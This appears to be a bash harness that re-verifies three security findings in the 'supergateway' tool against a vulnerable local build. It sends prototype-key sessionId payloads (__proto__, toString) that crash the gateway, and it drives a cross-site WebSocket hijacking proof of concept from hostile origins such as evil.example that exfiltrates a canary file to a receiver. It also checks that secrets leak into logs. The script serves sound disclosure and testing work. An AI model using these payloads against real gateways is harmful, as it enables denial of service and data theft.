#!/usr/bin/env bash
# End-to-end re-verification for SGW-2026-001 (RT-01), SGW-2026-002 (RT-02) and RT-03.
#
# Requires a built, VULNERABLE supergateway tree (see scripts/bootstrap.sh).
# Usage: ./verify_all.sh [rounds]          rounds default 3
# Env:   REPO=<path>                       default <repo>/.work/supergateway
#        CANARY=<file>                     default <repo>/evidence/canary.txt
#        RECV_PORT=<port>                  default 8899
#        HOSTIP=<ip>                      default first non-loopback address
set -uo pipefail
ENG="${ENG:-$(cd "$(dirname "$0")/.." && pwd)}"
REPO="${REPO:-$ENG/.work/supergateway}"
EV="${EV:-$ENG/.artifacts}"
POC="$ENG/pocs"
ROUNDS="${1:-3}"
CANARY="${CANARY:-$ENG/evidence/canary.txt}"
RECV_PORT="${RECV_PORT:-8899}"
EXPECT="$(cat "$CANARY")"
PASS=0; FAIL=0; GWS=()
[ -f "$REPO/dist/index.js" ] || { echo "FAIL: $REPO/dist/index.js missing (run scripts/bootstrap.sh)"; exit 1; }
mkdir -p "$EV/verification" "$EV/received"
freeport() { python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()'; }
portopen() { (exec 3<>/dev/tcp/127.0.0.1/$1) 2>/dev/null; local r=$?; exec 3>&- 2>/dev/null; return $r; }
start_gw() { local log="$1"; shift; node "$REPO/dist/index.js" "$@" > "$log" 2>&1 & echo $!; }
wait_http() { local url="$1" n=${2:-50}; for _ in $(seq 1 $n); do [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 1 "$url")" = "200" ] && return 0; sleep 0.1; done; return 1; }
ok() { PASS=$((PASS+1)); echo "PASS  $*"; }
no() { FAIL=$((FAIL+1)); echo "FAIL  $*"; }
cleanup() { for p in "${GWS[@]}"; do kill "$p" 2>/dev/null; done; [ -n "${RECV:-}" ] && kill "$RECV" 2>/dev/null; }
trap cleanup EXIT
echo "== target: $(git -C "$REPO" rev-parse --short HEAD) / $(node -p "require('$REPO/package.json').version") =="
echo "== rounds: $ROUNDS =="

# ---------- RT-01: prototype-key payload sweep ----------
for payload in toString __proto__ constructor hasOwnProperty valueOf; do
  for r in $(seq 1 "$ROUNDS"); do
    P=$(freeport)
    G=$(start_gw "$EV/verification/rt01_${payload}_${r}.log" --stdio "python3 $POC/canary_mcp_server.py" --port "$P" --baseUrl "http://127.0.0.1:$P" --healthEndpoint /healthz)
    GWS+=("$G"); sleep 0.3
    if ! wait_http "http://127.0.0.1:$P/healthz"; then no "RT-01 $payload r$r (gateway did not start)"; kill $G 2>/dev/null; continue; fi
    CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -X POST "http://127.0.0.1:$P/message?sessionId=$payload" 2>/dev/null)
    for _ in $(seq 1 20); do portopen "$P" || break; sleep 0.1; done
    if portopen "$P"; then no "RT-01 $payload r$r (process survived, curl=$CODE)"; kill $G 2>/dev/null; else ok "RT-01 $payload r$r (process died, curl=$CODE)"; fi
  done
done

# ---------- RT-01 over a non-loopback interface ----------
HOSTIP="${HOSTIP:-$(hostname -I 2>/dev/null | awk '{print $1}')}"
if [ -n "${HOSTIP:-}" ]; then
  P=$(freeport)
  G=$(start_gw "$EV/verification/rt01_lan.log" --stdio "python3 $POC/canary_mcp_server.py" --port "$P" --baseUrl "http://$HOSTIP:$P" --healthEndpoint /healthz)
  GWS+=("$G"); sleep 0.3
  wait_http "http://$HOSTIP:$P/healthz" && curl -s -o /dev/null --max-time 5 -X POST "http://$HOSTIP:$P/message?sessionId=toString"
  for _ in $(seq 1 20); do portopen "$P" || break; sleep 0.1; done
  portopen "$P" && { no "RT-01 non-loopback $HOSTIP (survived)"; kill $G 2>/dev/null; } || ok "RT-01 non-loopback $HOSTIP (crashed, unauthenticated)"
fi

# ---------- RT-01 negative control: API key ----------
for r in $(seq 1 "$ROUNDS"); do
  P=$(freeport)
  SUPERGATEWAY_API_KEY=K3yTest node "$REPO/dist/index.js" --stdio "python3 $POC/canary_mcp_server.py" --port "$P" --baseUrl "http://127.0.0.1:$P" --healthEndpoint /healthz > "$EV/verification/rt01_key_$r.log" 2>&1 &
  G=$!; GWS+=("$G"); sleep 0.4
  wait_http "http://127.0.0.1:$P/healthz" || { no "RT-01 key r$r start"; continue; }
  CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -X POST "http://127.0.0.1:$P/message?sessionId=toString")
  sleep 0.2
  if [ "$CODE" = 401 ] && portopen "$P"; then ok "RT-01 key r$r (401, alive)"; else no "RT-01 key r$r (code=$CODE)"; fi
  kill $G 2>/dev/null
done

# ---------- RT-02: CSWSH exfiltration sweep ----------
rm -f "$EV"/received/* 2>/dev/null
( cd "$EV" && python3 "$POC/receiver.py" "$RECV_PORT" > "$EV/verification/receiver.log" 2>&1 ) & RECV=$!
for _ in $(seq 1 30); do portopen "$RECV_PORT" && break; sleep 0.1; done
P=$(freeport)
G=$(start_gw "$EV/verification/rt02_gw.log" --stdio "python3 $POC/canary_mcp_server.py" --outputTransport ws --port "$P" --messagePath /ws --healthEndpoint /healthz)
GWS+=("$G")
for _ in $(seq 1 50); do portopen "$P" && break; sleep 0.1; done
for origin in "http://evil.example" "null" "https://attacker.test:4443" "http://localhost:9999"; do
  for r in $(seq 1 "$ROUNDS"); do
    OUT=$(cd "$EV/verification" && NODE_PATH="$REPO/node_modules" timeout 25 node "$POC/cswsh_ws_poc.js" "ws://127.0.0.1:$P/ws" "$CANARY" "http://127.0.0.1:$RECV_PORT" "$origin" 2>&1); RC=$?
    LAST=$(ls -t "$EV"/received/* 2>/dev/null | head -1)
    if [ $RC -eq 0 ] && grep -qF "$EXPECT" "$LAST" 2>/dev/null; then ok "RT-02 origin=$origin r$r (exfil delivered)"; else no "RT-02 origin=$origin r$r (rc=$RC)"; fi
  done
done
# negative: key required, no key / with key
P=$(freeport)
SUPERGATEWAY_API_KEY=K3yTest node "$REPO/dist/index.js" --stdio "python3 $POC/canary_mcp_server.py" --outputTransport ws --port "$P" --messagePath /ws > "$EV/verification/rt02_key.log" 2>&1 &
G=$!; GWS+=("$G")
for _ in $(seq 1 50); do portopen "$P" && break; sleep 0.1; done
NODE_PATH="$REPO/node_modules" timeout 20 node "$POC/cswsh_ws_poc.js" "ws://127.0.0.1:$P/ws" "$CANARY" "http://127.0.0.1:$RECV_PORT" >/dev/null 2>&1
[ $? -eq 2 ] && ok "RT-02 key negative (upgrade refused)" || no "RT-02 key negative (not refused)"
SGAUTH="Bearer K3yTest" NODE_PATH="$REPO/node_modules" timeout 25 node "$POC/cswsh_ws_poc.js" "ws://127.0.0.1:$P/ws" "$CANARY" "http://127.0.0.1:$RECV_PORT" >/dev/null 2>&1
[ $? -eq 0 ] && ok "RT-02 key positive (key grants access)" || no "RT-02 key positive"
kill $G 2>/dev/null

# ---------- RT-03: request body leaked to info log ----------
for r in $(seq 1 "$ROUNDS"); do
  P=$(freeport); LOG="$EV/verification/rt03_$r.log"
  G=$(start_gw "$LOG" --stdio "python3 $POC/canary_mcp_server.py" --port "$P" --baseUrl "http://127.0.0.1:$P" --healthEndpoint /healthz)
  GWS+=("$G")
  if ! wait_http "http://127.0.0.1:$P/healthz"; then no "RT-03 r$r (gateway did not start)"; kill $G 2>/dev/null; continue; fi
  curl -sN --max-time 10 "http://127.0.0.1:$P/sse" > "$EV/verification/rt03_stream_$r.log" 2>&1 & VS=$!
  SID=""
  for _ in $(seq 1 40); do SID=$(sed -n 's/^data: .*sessionId=//p' "$EV/verification/rt03_stream_$r.log" | head -1); [ -n "$SID" ] && break; sleep 0.1; done
  MARK="LOGMARK-$RANDOM$r"
  CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://127.0.0.1:$P/message?sessionId=$SID" -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":9,\"method\":\"tools/call\",\"params\":{\"name\":\"read_file\",\"arguments\":{\"path\":\"/etc/hostname\"},\"_meta\":{\"password\":\"$MARK\"}}}")
  FOUND=""
  for _ in $(seq 1 30); do grep -qF "$MARK" "$LOG" && { FOUND=1; break; }; sleep 0.1; done
  if [ -n "$FOUND" ]; then ok "RT-03 r$r (secret marker in info log, POST $CODE)"; else no "RT-03 r$r (marker absent, SID='$SID', POST $CODE)"; fi
  kill $VS 2>/dev/null; kill $G 2>/dev/null
done

echo "== RESULT: $PASS passed, $FAIL failed =="
[ "$FAIL" -eq 0 ]
